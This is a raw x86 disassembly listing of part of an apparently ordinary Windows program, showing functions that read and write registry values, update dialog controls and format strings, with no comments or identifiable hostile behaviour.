  409c16:	pop    esi
  409c17:	push   esi
  409c18:	push   esi
  409c19:	push   0x65
  409c1b:	pop    edi
  409c1c:	push   edi
  409c1d:	push   ebx
  409c1e:	mov    BYTE PTR ds:0x4136b8,0x1
  409c25:	call   DWORD PTR ds:0x414170
  409c2b:	push   esi
  409c2c:	push   ebx
  409c2d:	call   DWORD PTR ds:0x41415c
  409c33:	push   eax
  409c34:	call   DWORD PTR ds:0x41418c
  409c3a:	call   0x40916c
  409c3f:	test   eax,eax
  409c41:	je     0x409c50
  409c43:	push   edi
  409c44:	push   esi
  409c45:	push   edi
  409c46:	push   ebx
  409c47:	call   DWORD PTR ds:0x414170
  409c4d:	push   edi
  409c4e:	jmp    0x409c56
  409c50:	call   0x40929a
  409c55:	push   esi
  409c56:	push   ebx
  409c57:	call   DWORD PTR ds:0x41415c
  409c5d:	push   eax
  409c5e:	call   DWORD PTR ds:0x41418c
  409c64:	mov    BYTE PTR ds:0x4136b8,0x0
  409c6b:	jmp    0x409e4b
  409c70:	push   0xffffffff
  409c72:	push   DWORD PTR [ebp+0x8]
  409c75:	jmp    0x409cf1
  409c77:	mov    ebx,DWORD PTR [ebp+0x8]
  409c7a:	push   0x65
  409c7c:	push   ebx
  409c7d:	call   DWORD PTR ds:0x414160
  409c83:	push   0x6a
  409c85:	push   ebx
  409c86:	lea    edi,[eax-0x1]
  409c89:	neg    edi
  409c8b:	sbb    edi,edi
  409c8d:	inc    edi
  409c8e:	call   DWORD PTR ds:0x414160
  409c94:	test   eax,eax
  409c96:	je     0x409c9b
  409c98:	or     edi,0x10
  409c9b:	lea    eax,[ebp-0x4]
  409c9e:	xor    esi,esi
  409ca0:	push   eax
  409ca1:	lea    eax,[ebp-0x8]
  409ca4:	push   eax
  409ca5:	push   esi
  409ca6:	push   0x20006
  409cab:	push   esi
  409cac:	push   esi
  409cad:	push   esi
  409cae:	push   0x402998
  409cb3:	push   0x80000001
  409cb8:	call   DWORD PTR ds:0x414020
  409cbe:	test   eax,eax
  409cc0:	jne    0x409cef
  409cc2:	push   0x6a
  409cc4:	push   ebx
  409cc5:	call   DWORD PTR ds:0x414160
  409ccb:	push   0x4
  409ccd:	mov    DWORD PTR [ebp-0x4],eax
  409cd0:	lea    ecx,[ebp-0x4]
  409cd3:	pop    eax
  409cd4:	push   eax
  409cd5:	push   ecx
  409cd6:	push   eax
  409cd7:	push   esi
  409cd8:	push   0x402a2c
  409cdd:	push   DWORD PTR [ebp-0x8]
  409ce0:	call   DWORD PTR ds:0x41403c
  409ce6:	push   DWORD PTR [ebp-0x8]
  409ce9:	call   DWORD PTR ds:0x414008
  409cef:	push   edi
  409cf0:	push   ebx
  409cf1:	call   DWORD PTR ds:0x414158
  409cf7:	xor    eax,eax
  409cf9:	inc    eax
  409cfa:	jmp    0x409e4d
  409cff:	mov    edi,DWORD PTR [ebp+0x14]
  409d02:	xor    esi,esi
  409d04:	mov    ebx,DWORD PTR [ebp+0x8]
  409d07:	mov    edx,0x104
  409d0c:	push   ecx
  409d0d:	mov    ecx,0x4136d0
  409d12:	mov    DWORD PTR ds:0x4136bc,ebx
  409d18:	push   DWORD PTR [edi]
  409d1a:	push   esi
  409d1b:	call   0x4067ca
  409d20:	test   eax,eax
  409d22:	jns    0x409d38
  409d24:	push   eax
  409d25:	push   0x4051d4
  409d2a:	push   DWORD PTR ds:0x4130e8
  409d30:	call   0x40e7a0
  409d35:	add    esp,0xc
  409d38:	cmp    DWORD PTR [edi+0x4],esi
  409d3b:	je     0x409d49
  409d3d:	push   esi
  409d3e:	push   0x6a
  409d40:	push   ebx
  409d41:	call   DWORD PTR ds:0x414154
  409d47:	jmp    0x409daa
  409d49:	lea    eax,[ebp-0x4]
  409d4c:	push   eax
  409d4d:	lea    eax,[ebp-0x8]
  409d50:	push   eax
  409d51:	push   esi
  409d52:	push   0x20019
  409d57:	push   esi
  409d58:	push   esi
  409d59:	push   esi
  409d5a:	push   0x402998
  409d5f:	push   0x80000001
  409d64:	call   DWORD PTR ds:0x414020
  409d6a:	test   eax,eax
  409d6c:	jne    0x409daa
  409d6e:	push   0x4
  409d70:	pop    eax
  409d71:	mov    DWORD PTR [ebp-0x10],eax
  409d74:	mov    DWORD PTR [ebp-0xc],eax
  409d77:	lea    eax,[ebp-0xc]
  409d7a:	push   eax
  409d7b:	lea    eax,[ebp-0x4]
  409d7e:	mov    DWORD PTR [ebp-0x4],esi
  409d81:	push   eax
  409d82:	lea    eax,[ebp-0x10]
  409d85:	push   eax
  409d86:	push   esi
  409d87:	push   0x402a2c
  409d8c:	push   DWORD PTR [ebp-0x8]
  409d8f:	call   DWORD PTR ds:0x414000
  409d95:	push   DWORD PTR [ebp-0x4]
  409d98:	push   0x6a
  409d9a:	push   ebx
  409d9b:	call   DWORD PTR ds:0x414154
  409da1:	push   DWORD PTR [ebp-0x8]
  409da4:	call   DWORD PTR ds:0x414008
  409daa:	push   DWORD PTR [edi]
  409dac:	push   ebx
  409dad:	call   DWORD PTR ds:0x41417c
  409db3:	cmp    DWORD PTR [edi+0x8],esi
  409db6:	jne    0x409dd2
  409db8:	call   0x40916c
  409dbd:	test   eax,eax
  409dbf:	je     0x409dd2
  409dc1:	push   0x65
  409dc3:	pop    edi
  409dc4:	push   edi
  409dc5:	push   0x66
  409dc7:	push   edi
  409dc8:	push   ebx
  409dc9:	call   DWORD PTR ds:0x414170
  409dcf:	push   edi
  409dd0:	jmp    0x409de1
  409dd2:	push   0x66
  409dd4:	pop    esi
  409dd5:	push   esi
  409dd6:	push   esi
  409dd7:	push   0x65
  409dd9:	push   ebx
  409dda:	call   DWORD PTR ds:0x414170
  409de0:	push   esi
  409de1:	push   ebx
  409de2:	call   DWORD PTR ds:0x41415c
  409de8:	test   eax,eax
  409dea:	je     0x409df3
  409dec:	push   eax
  409ded:	call   DWORD PTR ds:0x41418c
  409df3:	call   DWORD PTR ds:0x4141ac
  409df9:	cmp    eax,0x2
  409dfc:	jne    0x409e4b
  409dfe:	call   DWORD PTR ds:0x4141b4
  409e04:	cmp    eax,0x6
  409e07:	jb     0x409e4b
  409e09:	push   0x6c
  409e0b:	push   ebx
  409e0c:	call   DWORD PTR ds:0x41415c
  409e12:	test   eax,eax
  409e14:	je     0x409e4b
  409e16:	mov    ecx,eax
  409e18:	call   0x40f203
  409e1d:	jmp    0x409e4b
  409e1f:	call   DWORD PTR ds:0x4141ac
  409e25:	cmp    eax,0x2
  409e28:	jne    0x409e4b
  409e2a:	call   DWORD PTR ds:0x4141b4
  409e30:	cmp    eax,0x6
  409e33:	jb     0x409e4b
  409e35:	push   0x6c
  409e37:	push   DWORD PTR [ebp+0x8]
  409e3a:	call   DWORD PTR ds:0x41415c
  409e40:	test   eax,eax
  409e42:	je     0x409e4b
  409e44:	mov    ecx,eax
  409e46:	call   0x40f2ac
  409e4b:	xor    eax,eax
  409e4d:	pop    edi
  409e4e:	pop    esi
  409e4f:	pop    ebx
  409e50:	mov    esp,ebp
  409e52:	pop    ebp
  409e53:	ret    0x10
  409e56:	int3   
  409e57:	int3   
  409e58:	int3   
  409e59:	int3   
  409e5a:	int3   
  409e5b:	mov    edi,edi
  409e5d:	push   ebp
  409e5e:	mov    ebp,esp
  409e60:	sub    esp,0x14c
  409e66:	mov    eax,ds:0x413004
  409e6b:	xor    eax,ebp
  409e6d:	mov    DWORD PTR [ebp-0x4],eax
  409e70:	push   ebx
  409e71:	push   esi
  409e72:	push   edi
  409e73:	mov    edi,ecx
  409e75:	lea    ecx,[ebp-0x148]
  409e7b:	call   0x40fa55
  409e80:	xor    edx,edx
  409e82:	lea    ecx,[ebp-0x148]
  409e88:	mov    esi,0x8000ffff
  409e8d:	mov    DWORD PTR [ebp-0x14c],edx
  409e93:	call   0x40fade
  409e98:	test   eax,eax
  409e9a:	je     0x409faa
  409ea0:	test   edi,edi
  409ea2:	je     0x409fa3
  409ea8:	cmp    WORD PTR [edi],dx
  409eab:	je     0x409fa3
  409eb1:	push   edi
  409eb2:	call   DWORD PTR ds:0x4141b8
  409eb8:	mov    ebx,eax
  409eba:	test   ebx,ebx
  409ebc:	je     0x409faf
  409ec2:	push   ebx
  409ec3:	call   DWORD PTR ds:0x414094
  409ec9:	push   0x402d14
  409ece:	lea    esi,[eax+0x1]
  409ed1:	call   DWORD PTR ds:0x414094
  409ed7:	add    esi,eax
  409ed9:	push   esi
  409eda:	call   DWORD PTR ds:0x4141b0
  409ee0:	mov    edi,eax
  409ee2:	mov    DWORD PTR [ebp-0x14c],edi
  409ee8:	test   edi,edi
  409eea:	je     0x409f95
  409ef0:	push   0x402d14
  409ef5:	push   ebx
  409ef6:	push   0x402d78
  409efb:	push   0x900
  409f00:	push   0x0
  409f02:	push   0x0
  409f04:	push   esi
  409f05:	push   edi
  409f06:	call   0x410fdd
  409f0b:	add    esp,0x20
  409f0e:	mov    esi,eax
  409f10:	push   edi
  409f11:	call   DWORD PTR ds:0x4141a8
  409f17:	mov    edi,eax
  409f19:	test   esi,esi
  409f1b:	js     0x409f87
  409f1d:	test   edi,edi
  409f1f:	je     0x409f87
  409f21:	mov    ecx,edi
  409f23:	call   0x410767
  409f28:	test   eax,eax
  409f2a:	je     0x409f87
  409f2c:	mov    ecx,DWORD PTR ds:0x4136c0
  409f32:	mov    edx,edi
  409f34:	push   0x24
  409f36:	push   0x402d24
  409f3b:	call   0x410123
  409f40:	mov    esi,eax
  409f42:	test   esi,esi
  409f44:	jns    0x409f8c
  409f46:	push   esi
  409f47:	push   0x402d80
  409f4c:	push   DWORD PTR ds:0x4130e8
  409f52:	call   0x40e818
  409f57:	mov    ecx,DWORD PTR ds:0x4136c0
  409f5d:	add    esp,0xc
  409f60:	mov    edx,edi
  409f62:	push   0x104
  409f67:	push   0x402d44
  409f6c:	call   0x410123
  409f71:	push   eax
  409f72:	push   0x402e18
  409f77:	push   DWORD PTR ds:0x4130e8
  409f7d:	call   0x40e818
  409f82:	add    esp,0xc
  409f85:	jmp    0x409f8c
  409f87:	mov    esi,0x80070002
  409f8c:	push   edi
  409f8d:	call   DWORD PTR ds:0x4141bc
  409f93:	jmp    0x409f9a
  409f95:	mov    esi,0x8007000e
  409f9a:	push   ebx
  409f9b:	call   DWORD PTR ds:0x4141bc
  409fa1:	jmp    0x409faf
  409fa3:	mov    esi,0x80070057
  409fa8:	jmp    0x409faf
  409faa:	mov    esi,0x80070661
  409faf:	push   DWORD PTR [ebp-0x14c]
  409fb5:	call   DWORD PTR ds:0x4141bc
  409fbb:	mov    ecx,DWORD PTR [ebp-0x4]
  409fbe:	mov    eax,esi
  409fc0:	pop    edi
  409fc1:	pop    esi
  409fc2:	xor    ecx,ebp
  409fc4:	pop    ebx
  409fc5:	call   0x411980
  409fca:	mov    esp,ebp
  409fcc:	pop    ebp
  409fcd:	ret    
  409fce:	int3   
  409fcf:	int3   
  409fd0:	int3   
  409fd1:	int3   
  409fd2:	int3   
  409fd3:	mov    edi,edi
  409fd5:	push   ebp
  409fd6:	mov    ebp,esp
  409fd8:	sub    esp,0x228
  409fde:	mov    eax,ds:0x413004
  409fe3:	xor    eax,ebp
  409fe5:	mov    DWORD PTR [ebp-0x4],eax
  409fe8:	mov    eax,DWORD PTR [ebp+0x8]
  409feb:	mov    DWORD PTR [ebp-0x224],eax
  409ff1:	push   ebx
  409ff2:	mov    ebx,edx
  409ff4:	mov    DWORD PTR [ebp-0x228],ebx
  409ffa:	test   ecx,ecx
  409ffc:	je     0x40a212
  40a002:	xor    edx,edx
  40a004:	cmp    dx,WORD PTR [ecx]
  40a007:	je     0x40a212
  40a00d:	test   ebx,ebx
  40a00f:	je     0x40a212
  40a015:	xor    ecx,ecx
  40a017:	cmp    cx,WORD PTR [ebx]
  40a01a:	je     0x40a212
  40a020:	test   eax,eax
  40a022:	je     0x40a212
  40a028:	cmp    cx,WORD PTR [eax]
  40a02b:	je     0x40a212
  40a031:	push   esi
  40a032:	push   edi
  40a033:	push   0x208
  40a038:	xor    esi,esi
  40a03a:	mov    edi,0x104
  40a03f:	call   DWORD PTR ds:0x4141b0
  40a045:	mov    DWORD PTR [ebp-0x218],eax
  40a04b:	test   eax,eax
  40a04d:	je     0x40a086
  40a04f:	push   ebx
  40a050:	push   edi
  40a051:	push   eax
  40a052:	push   0x401068
  40a057:	push   esi
  40a058:	push   esi
  40a059:	call   DWORD PTR ds:0x414114
  40a05f:	mov    ecx,eax
  40a061:	lea    eax,[edi-0x2]
  40a064:	cmp    ecx,eax
  40a066:	jne    0x40a0a4
  40a068:	add    edi,edi
  40a06a:	cmp    edi,0x100000
  40a070:	ja     0x40a086
  40a072:	lea    eax,[edi+edi*1]
  40a075:	push   eax
  40a076:	push   DWORD PTR [ebp-0x218]
  40a07c:	call   DWORD PTR ds:0x4141a4
  40a082:	test   eax,eax
  40a084:	jne    0x40a045
  40a086:	mov    edi,esi
  40a088:	push   DWORD PTR [ebp-0x218]
  40a08e:	call   DWORD PTR ds:0x4141bc
  40a094:	push   edi
  40a095:	call   DWORD PTR ds:0x4141bc
  40a09b:	pop    edi
  40a09c:	mov    eax,esi
  40a09e:	pop    esi
  40a09f:	jmp    0x40a214
  40a0a4:	test   ecx,ecx
  40a0a6:	je     0x40a086
  40a0a8:	mov    ebx,DWORD PTR [ebp-0x218]
  40a0ae:	mov    edi,0x104
  40a0b3:	push   0x208
  40a0b8:	mov    DWORD PTR [ebp-0x21c],edi
  40a0be:	call   DWORD PTR ds:0x4141b0
  40a0c4:	mov    DWORD PTR [ebp-0x214],eax
  40a0ca:	xor    ecx,ecx
  40a0cc:	cmp    cx,WORD PTR [ebx]
  40a0cf:	je     0x40a1f5
  40a0d5:	mov    DWORD PTR [ebp-0x220],esi
  40a0db:	test   eax,eax
  40a0dd:	je     0x40a207
  40a0e3:	push   DWORD PTR [ebp-0x228]
  40a0e9:	push   edi
  40a0ea:	push   eax
  40a0eb:	push   0x401068
  40a0f0:	push   esi
  40a0f1:	push   ebx
  40a0f2:	call   DWORD PTR ds:0x414114
  40a0f8:	mov    ecx,eax
  40a0fa:	lea    eax,[edi-0x2]
  40a0fd:	cmp    ecx,eax
  40a0ff:	jne    0x40a142
  40a101:	add    edi,edi
  40a103:	mov    DWORD PTR [ebp-0x21c],edi
  40a109:	cmp    edi,0x100000
  40a10f:	ja     0x40a207
  40a115:	lea    eax,[edi+edi*1]
  40a118:	mov    edi,DWORD PTR [ebp-0x214]
  40a11e:	push   eax
  40a11f:	push   edi
  40a120:	call   DWORD PTR ds:0x4141a4
  40a126:	test   eax,eax
  40a128:	je     0x40a088
  40a12e:	mov    ecx,DWORD PTR [ebp-0x220]
  40a134:	mov    edi,DWORD PTR [ebp-0x21c]
  40a13a:	mov    DWORD PTR [ebp-0x214],eax
  40a140:	jmp    0x40a159
  40a142:	test   ecx,ecx
  40a144:	je     0x40a207
  40a14a:	mov    eax,DWORD PTR [ebp-0x214]
  40a150:	xor    ecx,ecx
  40a152:	inc    ecx
  40a153:	mov    DWORD PTR [ebp-0x220],ecx
  40a159:	test   ecx,ecx
  40a15b:	je     0x40a0db
  40a161:	mov    edi,eax
  40a163:	test   eax,eax
  40a165:	je     0x40a1d6
  40a167:	mov    esi,DWORD PTR [ebp-0x224]
  40a16d:	xor    eax,eax
  40a16f:	cmp    ax,WORD PTR [edi]
  40a172:	je     0x40a1d4
  40a174:	push   esi
  40a175:	push   0x104
  40a17a:	lea    eax,[ebp-0x210]
  40a180:	push   eax
  40a181:	push   0x401068
  40a186:	push   edi
  40a187:	push   ebx
  40a188:	call   DWORD PTR ds:0x414114
  40a18e:	test   eax,eax
  40a190:	jne    0x40a1c5
  40a192:	push   DWORD PTR [ebp-0x228]
  40a198:	lea    eax,[ebp-0x210]
  40a19e:	push   0x104
  40a1a3:	push   eax
  40a1a4:	push   0x401068
  40a1a9:	push   edi
  40a1aa:	push   ebx
  40a1ab:	call   DWORD PTR ds:0x414114
  40a1b1:	test   eax,eax
  40a1b3:	je     0x40a1c5
  40a1b5:	push   esi
  40a1b6:	lea    eax,[ebp-0x210]
  40a1bc:	push   eax
  40a1bd:	push   edi
  40a1be:	push   ebx
  40a1bf:	call   DWORD PTR ds:0x41406c
  40a1c5:	push   edi
  40a1c6:	call   DWORD PTR ds:0x414068
  40a1cc:	lea    edi,[edi+eax*2]
  40a1cf:	add    edi,0x2
  40a1d2:	jne    0x40a16d
  40a1d4:	xor    esi,esi
  40a1d6:	push   ebx
  40a1d7:	call   DWORD PTR ds:0x414068
  40a1dd:	mov    edi,DWORD PTR [ebp-0x21c]
  40a1e3:	lea    ebx,[ebx+eax*2]
  40a1e6:	mov    eax,DWORD PTR [ebp-0x214]
  40a1ec:	add    ebx,0x2
  40a1ef:	jne    0x40a0ca
  40a1f5:	push   DWORD PTR [ebp-0x224]
  40a1fb:	push   esi
  40a1fc:	push   esi
  40a1fd:	push   esi
  40a1fe:	call   DWORD PTR ds:0x41406c
  40a204:	xor    esi,esi
  40a206:	inc    esi
  40a207:	mov    edi,DWORD PTR [ebp-0x214]
  40a20d:	jmp    0x40a088
  40a212:	xor    eax,eax
  40a214:	mov    ecx,DWORD PTR [ebp-0x4]
  40a217:	xor    ecx,ebp
  40a219:	pop    ebx
  40a21a:	call   0x411980
  40a21f:	mov    esp,ebp
  40a221:	pop    ebp
  40a222:	ret    0x4
  40a225:	int3   
  40a226:	int3   
  40a227:	int3   
  40a228:	int3   
  40a229:	int3   
  40a22a:	mov    edi,edi
  40a22c:	push   ebp
  40a22d:	mov    ebp,esp
  40a22f:	mov    eax,0x1470
  40a234:	call   0x412030
  40a239:	mov    eax,ds:0x413004
  40a23e:	xor    eax,ebp
  40a240:	mov    DWORD PTR [ebp-0x4],eax
  40a243:	push   esi
  40a244:	mov    esi,DWORD PTR [ebp+0xc]
  40a247:	mov    DWORD PTR [ebp-0x1470],edx
  40a24d:	mov    DWORD PTR [ebp-0x146c],ecx
  40a253:	push   edi
  40a254:	mov    edi,DWORD PTR [ebp+0x8]
  40a257:	test   esi,esi
  40a259:	je     0x40a45c
  40a25f:	xor    eax,eax
  40a261:	cmp    ax,WORD PTR [esi]
  40a264:	je     0x40a45c
  40a26a:	test   edi,edi
  40a26c:	je     0x40a45c
  40a272:	cmp    ax,WORD PTR [edi]
  40a275:	je     0x40a45c
  40a27b:	and    DWORD PTR [ebp-0x1464],eax
  40a281:	push   ebx
  40a282:	push   0x410
  40a287:	push   eax
  40a288:	mov    WORD PTR [ebp-0x624],ax
  40a28f:	xor    ebx,ebx
  40a291:	lea    eax,[ebp-0x622]
  40a297:	mov    DWORD PTR [ebp-0x1468],0x104
  40a2a1:	push   eax
  40a2a2:	inc    ebx
  40a2a3:	call   0x412060
  40a2a8:	xor    eax,eax
  40a2aa:	push   0x410
  40a2af:	push   eax
  40a2b0:	mov    WORD PTR [ebp-0xc44],ax
  40a2b7:	lea    eax,[ebp-0xc42]
  40a2bd:	push   eax
  40a2be:	call   0x412060
  40a2c3:	add    esp,0x18
  40a2c6:	lea    eax,[ebp-0x1464]
  40a2cc:	push   eax
  40a2cd:	xor    eax,eax
  40a2cf:	cmp    DWORD PTR [ebp-0x1470],eax
  40a2d5:	push   0x20019
  40a2da:	push   0x0
  40a2dc:	setne  al
  40a2df:	push   0x401588
  40a2e4:	add    eax,0x80000001
  40a2e9:	push   eax
  40a2ea:	call   DWORD PTR ds:0x414004
  40a2f0:	test   eax,eax
  40a2f2:	jne    0x40a400
  40a2f8:	lea    eax,[ebp-0x1468]
  40a2fe:	push   eax
  40a2ff:	lea    eax,[ebp-0x624]
  40a305:	push   eax
  40a306:	push   0x0
  40a308:	push   0x0
  40a30a:	push   edi
  40a30b:	push   DWORD PTR [ebp-0x1464]
  40a311:	call   DWORD PTR ds:0x414000
  40a317:	test   eax,eax
  40a319:	jne    0x40a400
  40a31f:	mov    eax,DWORD PTR [ebp-0x1468]
  40a325:	and    eax,0xfffffffe
  40a328:	cmp    eax,0x412
  40a32d:	jae    0x40a470
  40a333:	xor    ecx,ecx
  40a335:	mov    WORD PTR [ebp+eax*1-0x624],cx
  40a33d:	lea    eax,[ebp-0x210]
  40a343:	push   0x104
  40a348:	push   eax
  40a349:	lea    eax,[ebp-0x624]
  40a34f:	push   eax
  40a350:	call   DWORD PTR ds:0x4140b4
  40a356:	test   eax,eax
  40a358:	je     0x40a400
  40a35e:	lea    ecx,[ebp-0x210]
  40a364:	call   0x410767
  40a369:	test   eax,eax
  40a36b:	je     0x40a400
  40a371:	lea    eax,[ebp-0x210]
  40a377:	push   eax
  40a378:	lea    ecx,[ebp-0x1460]
  40a37e:	call   0x40eb66
  40a383:	lea    eax,[ebp-0x104a]
  40a389:	push   eax
  40a38a:	push   esi
  40a38b:	call   DWORD PTR ds:0x41407c
  40a391:	test   eax,eax
  40a393:	je     0x40a41a
  40a399:	cmp    DWORD PTR [ebp+0x10],0x0
  40a39d:	jne    0x40a3fd
  40a39f:	push   0x209
  40a3a4:	lea    eax,[ebp-0x624]
  40a3aa:	push   eax
  40a3ab:	push   0xe9
  40a3b0:	push   DWORD PTR [ebp-0x146c]
  40a3b6:	call   DWORD PTR ds:0x414188
  40a3bc:	test   eax,eax
  40a3be:	je     0x40a3fd
  40a3c0:	push   edi
  40a3c1:	lea    eax,[ebp-0x104a]
  40a3c7:	xor    ebx,ebx
  40a3c9:	push   eax
  40a3ca:	push   esi
  40a3cb:	lea    eax,[ebp-0x624]
  40a3d1:	push   eax
  40a3d2:	push   0x900
  40a3d7:	push   ebx
  40a3d8:	push   ebx
  40a3d9:	lea    eax,[ebp-0xc44]
  40a3df:	push   0x209
  40a3e4:	push   eax
  40a3e5:	call   0x410f98
  40a3ea:	add    esp,0x24
  40a3ed:	lea    eax,[ebp-0xc44]
  40a3f3:	push   ebx
  40a3f4:	push   edi
  40a3f5:	push   eax
  40a3f6:	push   ebx
  40a3f7:	call   DWORD PTR ds:0x414168
  40a3fd:	or     ebx,0xffffffff
  40a400:	cmp    DWORD PTR [ebp-0x1464],0x0
  40a407:	je     0x40a415
  40a409:	push   DWORD PTR [ebp-0x1464]
  40a40f:	call   DWORD PTR ds:0x414008
  40a415:	mov    eax,ebx
  40a417:	pop    ebx
  40a418:	jmp    0x40a45e
  40a41a:	push   esi
  40a41b:	push   0x4134a8
  40a420:	push   0x402ec4
  40a425:	push   0x900
  40a42a:	push   0x0
  40a42c:	push   0x0
  40a42e:	lea    eax,[ebp-0x830]
  40a434:	push   0x105
  40a439:	push   eax
  40a43a:	call   0x410f98
  40a43f:	add    esp,0x20
  40a442:	lea    eax,[ebp-0x830]
  40a448:	lea    edx,[ebp-0x210]
  40a44e:	mov    ecx,esi
  40a450:	push   eax
  40a451:	call   0x409fd3
  40a456:	test   eax,eax
  40a458:	jne    0x40a400
  40a45a:	jmp    0x40a3fd
  40a45c:	xor    eax,eax
  40a45e:	mov    ecx,DWORD PTR [ebp-0x4]
  40a461:	pop    edi
  40a462:	xor    ecx,ebp
  40a464:	pop    esi
  40a465:	call   0x411980
  40a46a:	mov    esp,ebp
  40a46c:	pop    ebp
  40a46d:	ret    0xc
  40a470:	call   0x411ad9
  40a475:	int3   
  40a476:	int3   
  40a477:	int3   
  40a478:	int3   
  40a479:	int3   
  40a47a:	int3   
  40a47b:	mov    edi,edi
  40a47d:	push   ebp
  40a47e:	mov    ebp,esp
  40a480:	mov    eax,0x1c94
  40a485:	call   0x412030
  40a48a:	mov    eax,ds:0x413004
  40a48f:	xor    eax,ebp
  40a491:	mov    DWORD PTR [ebp-0x4],eax
  40a494:	mov    eax,DWORD PTR [ebp+0xc]
  40a497:	push   ebx
  40a498:	push   esi
  40a499:	push   edi
  40a49a:	mov    edi,DWORD PTR [ebp+0x8]
  40a49d:	xor    esi,esi
  40a49f:	mov    DWORD PTR [ebp-0x1c88],eax
  40a4a5:	mov    ebx,edx
  40a4a7:	xor    eax,eax
  40a4a9:	mov    DWORD PTR [ebp-0x1c80],ecx
  40a4af:	push   0x410
  40a4b4:	mov    WORD PTR [ebp-0xa38],ax
  40a4bb:	lea    eax,[ebp-0xa36]
  40a4c1:	push   esi
  40a4c2:	push   eax
  40a4c3:	mov    DWORD PTR [ebp-0x1c8c],edi
  40a4c9:	mov    DWORD PTR [ebp-0x1c84],esi
  40a4cf:	call   0x412060
  40a4d4:	xor    eax,eax
  40a4d6:	push   0x410
  40a4db:	mov    WORD PTR [ebp-0x418],ax
  40a4e2:	lea    eax,[ebp-0x416]
  40a4e8:	push   esi
  40a4e9:	push   eax
  40a4ea:	call   0x412060
  40a4ef:	add    esp,0x18
  40a4f2:	lea    eax,[ebp-0x1c84]
  40a4f8:	push   eax
  40a4f9:	push   0x20019
  40a4fe:	push   esi
  40a4ff:	push   0x401588
  40a504:	push   0x80000002
  40a509:	call   DWORD PTR ds:0x414004
  40a50f:	test   eax,eax
  40a511:	jne    0x40a601
  40a517:	lea    eax,[ebp-0x1c90]
  40a51d:	mov    DWORD PTR [ebp-0x1c90],0x104
  40a527:	push   eax
  40a528:	lea    eax,[ebp-0x624]
  40a52e:	push   eax
  40a52f:	push   esi
  40a530:	push   esi
  40a531:	push   ebx
  40a532:	push   DWORD PTR [ebp-0x1c84]
  40a538:	call   DWORD PTR ds:0x414000
  40a53e:	test   eax,eax
  40a540:	jne    0x40a601
  40a546:	mov    eax,DWORD PTR [ebp-0x1c90]
  40a54c:	and    eax,0xfffffffe
  40a54f:	cmp    eax,0x20a
  40a554:	jae    0x40a8a0
  40a55a:	xor    ecx,ecx
  40a55c:	mov    WORD PTR [ebp+eax*1-0x624],cx
  40a564:	lea    ecx,[ebp-0x624]
  40a56a:	call   0x410767
  40a56f:	test   eax,eax
  40a571:	je     0x40a601
  40a577:	lea    eax,[ebp-0x624]
  40a57d:	push   eax
  40a57e:	lea    ecx,[ebp-0x1c7c]
  40a584:	call   0x40eb66
  40a589:	lea    eax,[ebp-0x1866]
  40a58f:	push   eax
  40a590:	push   edi
  40a591:	call   DWORD PTR ds:0x41407c
  40a597:	test   eax,eax
  40a599:	je     0x40a62b
  40a59f:	cmp    DWORD PTR [ebp+0x14],esi
  40a5a2:	jne    0x40a5fe
  40a5a4:	mov    edi,0x209
  40a5a9:	lea    eax,[ebp-0xa38]
  40a5af:	push   edi
  40a5b0:	push   eax
  40a5b1:	push   0xe9
  40a5b6:	push   DWORD PTR [ebp-0x1c80]
  40a5bc:	call   DWORD PTR ds:0x414188
  40a5c2:	push   ebx
  40a5c3:	lea    eax,[ebp-0x1866]
  40a5c9:	push   eax
  40a5ca:	push   DWORD PTR [ebp-0x1c8c]
  40a5d0:	lea    eax,[ebp-0xa38]
  40a5d6:	push   eax
  40a5d7:	push   0x900
  40a5dc:	push   esi
  40a5dd:	push   esi
  40a5de:	lea    eax,[ebp-0x418]
  40a5e4:	push   edi
  40a5e5:	push   eax
  40a5e6:	call   0x410f98
  40a5eb:	add    esp,0x24
  40a5ee:	push   esi
  40a5ef:	push   ebx
  40a5f0:	lea    eax,[ebp-0x418]
  40a5f6:	push   eax
  40a5f7:	push   esi
  40a5f8:	call   DWORD PTR ds:0x414168
  40a5fe:	or     esi,0xffffffff
  40a601:	cmp    DWORD PTR [ebp-0x1c84],0x0
  40a608:	je     0x40a616
  40a60a:	push   DWORD PTR [ebp-0x1c84]
  40a610:	call   DWORD PTR ds:0x414008
  40a616:	mov    ecx,DWORD PTR [ebp-0x4]
  40a619:	mov    eax,esi
  40a61b:	pop    edi
  40a61c:	pop    esi
  40a61d:	xor    ecx,ebp
  40a61f:	pop    ebx
  40a620:	call   0x411980
  40a625:	mov    esp,ebp
  40a627:	pop    ebp
  40a628:	ret    0x14
  40a62b:	lea    eax,[ebp-0x624]
  40a631:	push   eax
  40a632:	push   esi
  40a633:	push   0x402860
  40a638:	push   0x4028d4
  40a63d:	call   DWORD PTR ds:0x414070
  40a643:	push   edi
  40a644:	push   0x4134a8
  40a649:	push   0x402ec4
  40a64e:	push   0x900
  40a653:	push   esi
  40a654:	push   esi
  40a655:	mov    DWORD PTR [ebp-0x1c94],eax
  40a65b:	lea    eax,[ebp-0xc44]
  40a661:	push   0x105
  40a666:	push   eax
  40a667:	call   0x410f98
  40a66c:	add    esp,0x20
  40a66f:	test   eax,eax
  40a671:	js     0x40a5fe
  40a673:	lea    eax,[ebp-0xc44]
  40a679:	push   eax
  40a67a:	push   esi
  40a67b:	push   0x402860
  40a680:	push   0x4028d4
  40a685:	call   DWORD PTR ds:0x414070
  40a68b:	mov    ecx,DWORD PTR [ebp-0x1c94]
  40a691:	cmp    ecx,eax
  40a693:	jle    0x40a6e5
  40a695:	cmp    DWORD PTR [ebp+0x14],esi
  40a698:	jne    0x40a5fe
  40a69e:	mov    edi,0x209
  40a6a3:	lea    eax,[ebp-0xa38]
  40a6a9:	push   edi
  40a6aa:	push   eax
  40a6ab:	push   0xdd
  40a6b0:	push   DWORD PTR [ebp-0x1c80]
  40a6b6:	call   DWORD PTR ds:0x414188
  40a6bc:	push   ebx
  40a6bd:	lea    eax,[ebp-0xa38]
  40a6c3:	push   eax
  40a6c4:	push   0x900
  40a6c9:	push   esi
  40a6ca:	push   esi
  40a6cb:	lea    eax,[ebp-0x418]
  40a6d1:	push   edi
  40a6d2:	push   eax
  40a6d3:	call   0x410f98
  40a6d8:	add    esp,0x1c
  40a6db:	push   0x41000
  40a6e0:	jmp    0x40a5ef
  40a6e5:	cmp    ecx,0x4
  40a6e8:	jge    0x40a601
  40a6ee:	call   0x408fdb
  40a6f3:	test   eax,eax
  40a6f5:	jne    0x40a742
  40a6f7:	cmp    DWORD PTR [ebp+0x14],esi
  40a6fa:	jne    0x40a5fe
  40a700:	mov    edi,0x209
  40a705:	lea    eax,[ebp-0xa38]
  40a70b:	push   edi
  40a70c:	push   eax
